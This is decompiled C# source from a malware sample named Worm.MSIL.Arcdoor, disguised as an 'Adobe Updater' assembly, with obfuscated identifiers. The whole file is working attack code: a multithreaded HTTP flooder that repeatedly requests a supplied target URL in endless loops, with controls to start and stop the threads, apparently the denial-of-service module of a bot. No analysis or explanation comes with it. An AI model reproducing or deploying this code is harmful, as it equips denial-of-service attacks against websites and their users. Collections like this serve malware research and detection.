// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using System.Net;
using System.Threading;

internal sealed class \u0008
{
  private ThreadStart[] \u0002;
  private Thread[] \u0003;
  public string \u0005;
  public int \u0008 = 20;
  public bool \u0006;
  private \u0008.\u0002[] \u000E;
  public int \u000F = 2;

  public void \u0002()
  {
    this.\u0003 = new Thread[this.\u000F];
    this.\u0002 = new ThreadStart[this.\u000F];
    this.\u000E = new \u0008.\u0002[this.\u000F];
    for (int index = 0; index < this.\u000F; ++index)
    {
      this.\u000E[index] = new \u0008.\u0002(this.\u0005, this.\u0008);
      this.\u0002[index] = new ThreadStart(this.\u000E[index].\u0002);
      this.\u0003[index] = new Thread(this.\u0002[index]);
      this.\u0003[index].Start();
    }
    this.\u0006 = true;
  }

  public void \u0003()
  {
    for (int index = 0; index < this.\u000F; ++index)
    {
      try
      {
        this.\u0003[index].Abort();
        this.\u0003[index] = (Thread) null;
        this.\u0002[index] = (ThreadStart) null;
        this.\u000E[index] = (\u0008.\u0002) null;
      }
      catch
      {
      }
    }
    this.\u0006 = false;
  }

  private sealed class \u0002
  {
    private string \u0002;
    private WebClient \u0003 = new WebClient();
    private int \u0005;

    public \u0002(string _param1, int _param2)
    {
      this.\u0002 = _param1;
      this.\u0005 = _param2;
    }

    public void \u0002()
    {
      while (true)
      {
        try
        {
          this.\u0003.DownloadString(this.\u0002);
          Thread.Sleep(this.\u0005);
        }
        catch
        {
          Thread.Sleep(this.\u0005);
        }
      }
    }
  }
}
